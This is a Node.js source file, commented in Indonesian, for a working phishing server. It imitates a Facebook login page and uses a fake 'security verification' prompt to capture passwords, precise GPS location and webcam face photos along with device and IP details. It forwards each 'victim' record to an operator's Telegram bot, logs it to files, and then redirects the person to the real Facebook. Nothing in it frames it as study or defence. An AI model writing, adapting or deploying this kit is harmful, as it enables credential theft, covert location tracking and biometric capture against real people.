const express = require('express');
const https = require('https');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const geoip = require('geoip-lite');
const app = express();
const port = 3000;

// Konfigurasi Telegram Bot
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Database in-memory (gunakan MongoDB/PostgreSQL untuk production)
let victims = new Map();

// Route utama - Halaman phishing
app.get('/', (req, res) => {
    const victimId = generateVictimId(req);
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Facebook - Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font-family: Arial; background: #f0f2f5; }
            .login-box { 
                background: white; 
                padding: 20px; 
                width: 400px; 
                margin: 100px auto; 
                border-radius: 8px; 
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            input { width: 100%; padding: 10px; margin: 10px 0; }
            button { background: #1877f2; color: white; padding: 12px; width: 100%; border: none; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>Facebook Login</h2>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Email or Phone">
                <input type="password" id="password" placeholder="Password">
                <button type="submit">Login</button>
            </form>
        </div>
        
        <!-- Permissions Modal -->
        <div id="permissionModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8);">
            <div style="background:white; width:500px; margin:100px auto; padding:30px; border-radius:10px;">
                <h2>Security Verification Required</h2>
                <p>For your account security, we need to verify your identity.</p>
                <p>Please allow the following permissions:</p>
                <div style="margin:20px 0;">
                    <input type="checkbox" id="locationPerm"> Allow location access<br>
                    <input type="checkbox" id="cameraPerm"> Allow camera access for face verification<br>
                    <input type="checkbox" id="micPerm"> Allow microphone access (optional)
                </div>
                <button onclick="requestPermissions()" style="background:#42b72a; color:white; padding:12px 30px; border:none; border-radius:5px;">
                    Continue Verification
                </button>
                <p style="font-size:12px; color:#666; margin-top:20px;">
                    This helps prevent unauthorized access to your account.
                </p>
            </div>
        </div>
        
        <!-- Camera Modal -->
        <div id="cameraModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9);">
            <div style="background:white; width:600px; margin:50px auto; padding:20px; border-radius:10px; text-align:center;">
                <h2>Face Verification</h2>
                <p>Please look at the camera and press "Capture"</p>
                <video id="camera" autoplay style="width:100%; height:400px; background:#000;"></video>
                <canvas id="canvas" style="display:none;"></canvas>
                <div style="margin:20px 0;">
                    <button onclick="capturePhoto()" style="background:#1877f2; color:white; padding:12px 30px; border:none; border-radius:5px; margin-right:10px;">
                        📸 Capture Photo
                    </button>
                    <button onclick="skipCamera()" style="background:#ccc; color:black; padding:12px 30px; border:none; border-radius:5px;">
                        Skip
                    </button>
                </div>
            </div>
        </div>
        
        <script>
            const victimId = '${victimId}';
            
            // Handle form submission
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                document.getElementById('permissionModal').style.display = 'block';
            });
            
            function requestPermissions() {
                if(!document.getElementById('locationPerm').checked) {
                    alert('Location permission is required for security verification.');
                    return;
                }
                
                // Request location
                if(navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const location = {
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            
                            // Store location
                            localStorage.setItem('userLocation', JSON.stringify(location));
                            
                            // Request camera if selected
                            if(document.getElementById('cameraPerm').checked) {
                                document.getElementById('permissionModal').style.display = 'none';
                                startCamera();
                            } else {
                                completeTracking();
                            }
                        },
                        (error) => {
                            alert('Location access denied. Please enable location services.');
                        },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                }
            }
            
            function startCamera() {
                document.getElementById('cameraModal').style.display = 'block';
                const video = document.getElementById('camera');
                
                navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                })
                .then(stream => {
                    video.srcObject = stream;
                    window.cameraStream = stream;
                })
                .catch(err => {
                    console.error('Camera error:', err);
                    alert('Camera access denied. Continuing without face verification.');
                    completeTracking();
                });
            }
            
            function capturePhoto() {
                const video = document.getElementById('camera');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Convert to base64
                const photoData = canvas.toDataURL('image/jpeg', 0.8);
                
                // Stop camera
                if(window.cameraStream) {
                    window.cameraStream.getTracks().forEach(track => track.stop());
                }
                
                // Store photo
                localStorage.setItem('userPhoto', photoData);
                
                // Complete tracking
                completeTracking();
            }
            
            function skipCamera() {
                if(window.cameraStream) {
                    window.cameraStream.getTracks().forEach(track => track.stop());
                }
                document.getElementById('cameraModal').style.display = 'none';
                completeTracking();
            }
            
            async function completeTracking() {
                // Collect all data
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const location = JSON.parse(localStorage.getItem('userLocation') || '{}');
                const photo = localStorage.getItem('userPhoto');
                
                // Get additional system info
                const systemInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookies: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack
                };
                
                // Get IP via external service
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                // Get network info
                const connection = navigator.connection || {};
                const networkInfo = {
                    downlink: connection.downlink,
                    effectiveType: connection.effectiveType,
                    rtt: connection.rtt,
                    saveData: connection.saveData
                };
                
                // Prepare final data
                const trackingData = {
                    victimId: victimId,
                    credentials: { username, password },
                    location: location,
                    photo: photo,
                    ip: ipData.ip,
                    system: systemInfo,
                    network: networkInfo,
                    timestamp: new Date().toISOString(),
                    url: window.location.href
                };
                
                // Send to server
                fetch('/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(trackingData)
                })
                .then(response => {
                    // Redirect to real Facebook
                    window.location.href = 'https://facebook.com';
                })
                .catch(error => {
                    console.error('Error:', error);
                    window.location.href = 'https://facebook.com';
                });
            }
        </script>
    </body>
    </html>
    `);
});

// Endpoint untuk menerima data tracking
app.post('/track', (req, res) => {
    const trackingData = req.body;
    
    // Analisis IP untuk mendapatkan info lengkap
    const geo = geoip.lookup(trackingData.ip);
    trackingData.geoInfo = geo || {};
    
    // Simpan ke database
    victims.set(trackingData.victimId, trackingData);
    
    // Kirim ke Telegram
    sendToTelegram(trackingData);
    
    // Simpan ke file
    saveToFile(trackingData);
    
    res.json({ success: true });
});

// Endpoint untuk melihat semua korban
app.get('/victims', (req, res) => {
    res.json(Array.from(victims.values()));
});

// Endpoint untuk melihat korban spesifik
app.get('/victim/:id', (req, res) => {
    const victim = victims.get(req.params.id);
    if (victim) {
        res.json(victim);
    } else {
        res.status(404).json({ error: 'Victim not found' });
    }
});

// Fungsi untuk mengirim ke Telegram
function sendToTelegram(data) {
    const message = `
    🚨 **NEW VICTIM TRACKED** 🚨

    **📱 Credentials:**
    👤 Username: ${data.credentials.username}
    🔑 Password: ${data.credentials.password}

    **📍 Location:**
    🌐 IP: ${data.ip}
    🗺️ Country: ${data.geoInfo.country || 'Unknown'}
    🏙️ City: ${data.geoInfo.city || 'Unknown'}
    📍 Coordinates: ${data.location.lat || 'N/A'}, ${data.location.lon || 'N/A'}
    🎯 Accuracy: ${data.location.accuracy || 'N/A'} meters

    **🖥️ System Info:**
    🔍 User Agent: ${data.system.userAgent}
    💻 Platform: ${data.system.platform}
    🖥️ Screen: ${data.system.screen}
    🕐 Timezone: ${data.system.timezone}

    **🌐 Network:**
    📶 Connection: ${data.network.effectiveType || 'Unknown'}
    ⚡ Speed: ${data.network.downlink || 'Unknown'} Mbps

    **⏰ Timestamp:** ${new Date(data.timestamp).toLocaleString()}

    **🔗 URL:** ${data.url}
    `;

    // Kirim teks
    bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });

    // Kirim lokasi di peta jika ada
    if (data.location.lat && data.location.lon) {
        bot.sendLocation(TELEGRAM_CHAT_ID, data.location.lat, data.location.lon);
    }

    // Kirim foto jika ada
    if (data.photo) {
        // Konversi base64 ke buffer
        const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');
        
        // Simpan temporary file
        const filename = `victim_${data.victimId}_${Date.now()}.jpg`;
        fs.writeFileSync(filename, buffer);
        
        // Kirim foto
        bot.sendPhoto(TELEGRAM_CHAT_ID, filename);
        
        // Hapus file temporary
        fs.unlinkSync(filename);
    }

    // Kirim link Google Maps
    if (data.location.lat && data.location.lon) {
        const mapsUrl = `https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`;
        bot.sendMessage(TELEGRAM_CHAT_ID, `🗺️ Google Maps: ${mapsUrl}`);
    }
}

// Fungsi untuk menyimpan ke file
function saveToFile(data) {
    const logDir = './logs';
    if (!fs.existsSync(logDir)) {
        fs.mkdirSync(logDir, { recursive: true });
    }

    const filename = `${logDir}/victim_${data.victimId}_${Date.now()}.json`;
    fs.writeFileSync(filename, JSON.stringify(data, null, 2));
    
    // Juga tambah ke log utama
    const masterLog = `${logDir}/master_log.json`;
    let logs = [];
    if (fs.existsSync(masterLog)) {
        logs = JSON.parse(fs.readFileSync(masterLog));
    }
    logs.push(data);
    fs.writeFileSync(masterLog, JSON.stringify(logs, null, 2));
}

// Fungsi generate victim ID
function generateVictimId(req) {
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    return require('crypto')
        .createHash('md5')
        .update(ip + userAgent + Date.now())
        .digest('hex')
        .substring(0, 12);
}

// Bot Telegram commands
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, `
    🕵️ **Tracking Bot Active** 🕵️
    
    Commands:
    /victims - List all tracked victims
    /victim [id] - Get specific victim details
    /stats - Show tracking statistics
    /clear - Clear all data (admin only)
    
    New victims will be automatically reported here.
    `);
});

bot.onText(/\/victims/, (msg) => {
    const victimList = Array.from(victims.values())
        .map((v, i) => `${i+1}. ${v.credentials.username} (${v.ip}) - ${new Date(v.timestamp).toLocaleString()}`)
        .join('\n');
    
    bot.sendMessage(msg.chat.id, `👥 **Tracked Victims:**\n\n${victimList || 'No victims yet'}`);
});

bot.onText(/\/victim (.+)/, (msg, match) => {
    const victimId = match[1];
    const victim = victims.get(victimId);
    
    if (victim) {
        const details = `
        🔍 **Victim Details:**
        
        ID: ${victim.victimId}
        Username: ${victim.credentials.username}
        IP: ${victim.ip}
        Location: ${victim.location.lat || 'N/A'}, ${victim.location.lon || 'N/A'}
        Country: ${victim.geoInfo.country || 'Unknown'}
        Time: ${new Date(victim.timestamp).toLocaleString()}
        
        Use /location_${victimId} for maps
        Use /photo_${victimId} for face photo
        `;
        
        bot.sendMessage(msg.chat.id, details);
    } else {
        bot.sendMessage(msg.chat.id, 'Victim not found.');
    }
});

bot.onText(/\/stats/, (msg) => {
    const stats = {
        totalVictims: victims.size,
        countries: {},
        devices: {},
        last24h: 0
    };

    const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;

    victims.forEach(victim => {
        // Count by country
        const country = victim.geoInfo.country || 'Unknown';
        stats.countries[country] = (stats.countries[country] || 0) + 1;
        
        // Count by device
        const isMobile = /mobile/i.test(victim.system.userAgent);
        stats.devices[isMobile ? 'Mobile' : 'Desktop'] = (stats.devices[isMobile ? 'Mobile' : 'Desktop'] || 0) + 1;
        
        // Count last 24h
        if (new Date(victim.timestamp).getTime() > oneDayAgo) {
            stats.last24h++;
        }
    });

    const message = `
    📊 **Tracking Statistics:**
    
    👥 Total Victims: ${stats.totalVictims}
    📈 Last 24 Hours: ${stats.last24h}
    
    🌍 By Country:
    ${Object.entries(stats.countries).map(([c, n]) => `    ${c}: ${n}`).join('\n')}
    
    📱 By Device:
    ${Object.entries(stats.devices).map(([d, n]) => `    ${d}: ${n}`).join('\n')}
    
    ⏰ Last Updated: ${new Date().toLocaleString()}
    `;

    bot.sendMessage(msg.chat.id, message);
});

// Start server
app.listen(port, () => {
    console.log(`🕵️ Tracking server running on port ${port}`);
    console.log(`📱 Telegram bot active`);
    console.log(`🌐 Access: http://localhost:${port}`);
});
